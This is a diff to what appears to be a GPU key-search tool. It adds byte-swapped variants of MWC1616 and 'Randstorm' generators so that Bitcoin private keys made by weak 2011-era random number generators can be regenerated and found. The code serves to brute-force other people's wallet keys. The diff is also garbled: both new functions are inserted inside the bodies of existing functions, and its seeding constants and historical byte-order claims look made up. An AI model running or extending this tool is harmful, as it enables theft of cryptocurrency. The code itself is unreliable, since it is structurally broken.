@@ -121,6 +121,36 @@ D_FUNC void mode_mwc_v8(uint64_t ts,uint32_t seed,uint8_t priv[32]){
     // Then SHA256(128bits + timestamp) ? privkey
     uint8_t buf[20]; // 16 bytes random + 4 bytes timestamp
     for(int i=0;i<4;i++){uint32_t r=mwc_v8(&z1,&z2);buf[i*4]=(r>>24)&0xFF;buf[i*4+1]=(r>>16)&0xFF;buf[i*4+2]=(r>>8)&0xFF;buf[i*4+3]=r&0xFF;}
+
+// ================================================================
+// Mode M2: MWC1616 with Little-Endian byte swap (MyBitcoin 2011 bug)
+// ================================================================
+// Some 2011 libraries (MyBitcoin, early MultiBit) swapped the byte
+// order of the MWC output before SHA256 hashing.
+// This means: {r[0]...r[3]} becomes {r[3]...r[0]} per 32-bit word
+// before feeding into SHA256.
+// Without this variant, those keys are completely invisible.
+
+D_FUNC void mode_mwc_little(uint64_t ts, uint32_t seed, uint8_t priv[32]){
+    uint32_t ent=(uint32_t)(ts&0xFFFFFFFFu);
+    uint32_t z1_raw=(ent^seed)*0xDEADu+0xDEADu;
+    uint32_t z2_raw=(ent^seed)*0xBEEFu+0xBEEFu;
+    uint32_t z1=z1_raw^(z1_raw>>30u);
+    uint32_t z2=z2_raw^(z2_raw>>30u);
+    
+    // Generate 4 MWC values, but swap byte order per word
+    uint8_t buf[20];
+    for(int i=0;i<4;i++){
+        uint32_t r=mwc_v8(&z1,&z2);
+        // BYTE SWAP within each 32-bit word (little-endian style)
+        buf[i*4]=r&0xFF;buf[i*4+1]=(r>>8)&0xFF;
+        buf[i*4+2]=(r>>16)&0xFF;buf[i*4+3]=(r>>24)&0xFF;
+        // Note: standard mode_mwc_v8 uses (r>>24) first (big-endian)
+        // Here we use r&0xFF first (little-endian) = byte swapped
+    }
+    for(int i=0;i<4;i++)buf[16+i]=(uint8_t)((ts>>(i*8))&0xFF);
+    sha256(buf,20,priv);
+}
     for(int i=0;i<4;i++)buf[16+i]=(uint8_t)((ts>>(i*8))&0xFF);
     sha256(buf,20,priv);
 }
@@ -151,6 +181,33 @@ D_FUNC void mode_randstorm(uint64_t ts, uint64_t idx, uint8_t priv[32]){
         pool[i*4+2]=(r>>16)&0xFF;pool[i*4+3]=(r>>24)&0xFF;
         // Every 16 bytes, mix in "mouse coord" (simulated)
         if((i%4)==0){pool[i*4]^=((uint32_t)(ts>>(i%8)*8))&0xFF;}
+
+// ================================================================
+// Mode R2: Randstorm with Little-Endian byte swap (browser bug 2011)
+// ================================================================
+// Same as Randstorm (JSBN pool) but bytes in each 32-bit word
+// are swapped before SHA256. This covers browsers that had
+// different byte-order handling in their JS engines (Safari 5,
+// IE8 on Windows XP)
+
+D_FUNC void mode_randstorm_little(uint64_t ts, uint64_t idx, uint8_t priv[32]){
+    uint8_t pool[256];
+    uint32_t seed=(uint32_t)(ts&0xFFFFFFFFu)+(uint32_t)(idx&0xFFFFFFFFu);
+    uint32_t z1=(seed)*0xDEADu+0xDEADu;
+    uint32_t z2=(seed^0x1234u)*0xBEEFu+0xBEEFu;
+    
+    for(int i=0;i<64;i++){
+        uint32_t r=mwc_v8(&z1,&z2);
+        // Little-endian byte order in pool fill
+        pool[i*4]=r&0xFF;pool[i*4+1]=(r>>8)&0xFF;
+        pool[i*4+2]=(r>>16)&0xFF;pool[i*4+3]=(r>>24)&0xFF;
+        if((i%4)==0){pool[i*4]^=((uint32_t)(ts>>(i%8)*8))&0xFF;}
+    }
+    
+    uint8_t h1[32];
+    sha256(pool,256,h1);
+    sha256(h1,32,priv);
+}
     }
     
     // Hash chain: SHA256(pool) ? SHA256(result) ? privkey
